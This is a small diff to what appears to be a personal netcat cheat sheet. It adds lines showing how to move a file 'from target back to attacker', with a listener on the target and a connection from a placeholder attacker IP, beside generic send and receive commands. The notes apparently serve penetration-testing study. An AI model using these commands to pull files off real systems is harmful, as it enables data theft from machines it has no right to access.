@@ -9,5 +9,11 @@ nc [options] [host] [port number]
 
 -v -vv #verbose and v v
 
+
+####sending files with netcat######
+1-move from target back to attacker:
+-target: nc -l -p xxxx < filename
+-attacker nc x.x.x.x xxxx > filename
+
 nc x.x.x.x xxxx < filename.out #send file
 nc -l xxxx > filename.in #receive file
